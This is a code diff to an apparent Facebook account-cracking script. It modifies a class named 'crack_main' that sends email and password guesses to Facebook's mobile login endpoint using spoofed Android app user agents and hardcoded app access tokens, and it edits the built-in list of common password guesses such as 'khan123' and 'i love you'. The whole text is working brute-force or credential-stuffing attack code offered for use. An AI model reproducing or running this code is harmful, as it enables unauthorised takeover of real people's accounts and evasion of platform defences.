@@ -385,16 +385,16 @@ class crack_main():
                                 try:
                                         version_,model_,brand_name_,width_,height_=infos.split('$')
                                 except:
-                                        version_ = str(random.randint(8,12))
+                                        version_ = str(random.randint(7,13))
                                         model_ = "Infinix"
                                         brand_name_ = "Infinix"
                                         width_ = "720"
                                         height_ = "1280"
-                                uas = 'Mozilla/5.0 (Linux; Android 10; Hisense Infinity H40 Lite Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/108.0.5359.128 Mobile Safari/537.36[FBAN/EMA;FBLC/en_US;FBAV/244.0.0.6.117;]'
-                                fak_tn="153779441997719|n2YEBqamkrdDYJBUkjxmNzuZS5c","300340197101744|lGCTj7yrAEvAWivDSvcBOJXu-Lw"
+                                uas = 'Dalvik/2.1.0 (Linux; U; Android '+version_+'.0.0; '+model_+' Build/8BFOHT) [FBAN/FB4A;FBAV/92.866.944.616;FBPN/com.facebook.katana;FBLC/en_US;FBBV/322216925;FBCR/null;FBMF/'+brand_name_+';FBBD/'+brand_name_+';FBDV/'+model_+';FBSV/'+version_+'.0.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.25,width='+width_+',height='+height_+'};]'
+                                fak_tn="350685531728|62f8ce9f74b12f84c123cc23437a4a32","275254692598279|585aec5b4c27376758abb7ffcb9db2af"
                                 adid = str(uuid.uuid4())
-                                abhi = "779441997719|n2YE"
-                                head = {'Connection': 'keep-alive', 'Authorization': 'OAuth 153'+abhi+'BqamkrdDYJBUkjxmNzuZS5c', 'Host': 'b-graph.facebook.com', 'X-FB-Friendly-Name': 'authenticate', 'X-FB-Connection-Bandwidth': str(random.randint(2e7, 3e7)), 'X-FB-Net-HNI': str(random.randint(2e4, 4e4)), 'X-FB-SIM-HNI': str(random.randint(2e4, 4e4)), 'X-FB-Connection-Quality': 'EXCELLENT', 'X-FB-Connection-Token': '', 'X-FB-Connection-Type': 'MOBILE.WCDMA', 'User-Agent': zee, 'Accept-Encoding': 'gzip, deflate', 'Content-Type': 'application/x-www-form-urlencoded', 'X-FB-HTTP-Engine': 'Liger', 'Content-Length': '531'}
+                                abhi = "5531728|62f8ce9"
+                                head = {'Connection': 'keep-alive', 'Authorization': 'OAuth 35068'+abhi+'f74b12f84c123cc23437a4a32', 'Host': 'b-graph.facebook.com', 'X-FB-Friendly-Name': 'authenticate', 'X-FB-Connection-Bandwidth': str(random.randint(2e7, 3e7)), 'X-FB-Net-HNI': str(random.randint(2e4, 4e4)), 'X-FB-SIM-HNI': str(random.randint(2e4, 4e4)), 'X-FB-Connection-Quality': 'EXCELLENT', 'X-FB-Connection-Token': '', 'X-FB-Connection-Type': 'MOBILE.WCDMA', 'User-Agent': uas, 'Accept-Encoding': 'gzip, deflate', 'Content-Type': 'application/x-www-form-urlencoded', 'X-FB-HTTP-Engine': 'Liger', 'Content-Length': '531'}
                                 data = "adid="+adid+"&email="+iid+"&password="+pas+"&cpl=true&credentials_type=password&error_detail_type=password&source=device_based_login&format=json&device_id="+adid+"&family_device_id="+adid+"&session_id="+adid+"&generate_session_cookies=1&generate_analytics_claim=1&generate_machine_id=1&locale=en_US&client_country_code=US&advertising_id="+adid+"&fb_api_req_friendly_name=authenticateate"
                                 po = requests.post('https://b-graph.facebook.com/auth/login',headers=head,data=data).json()
                                 #print(po,hdata)ata)
@@ -448,15 +448,15 @@ class crack_main():
                         passlist.append('first123')
                         passlist.append('first12345')
                         passlist.append('first1234')
-                        passlist.append('firstlast')
-                        passlist.append('first last')
-                        passlist.append('last786')
+                        passlist.append('khan12')
+                        passlist.append('khankhan')
+                        passlist.append('khan123')
                         passlist.append('first786')
                         passlist.append('first12')
                         passlist.append('first1122')
                         passlist.append('last123')
                         passlist.append('last12')
-                        passlist.append('last1122')
+                        passlist.append('i love you')
                 else:
                         print(' Example first123,last123,khan123,firstlast')
                         print(50*"=")
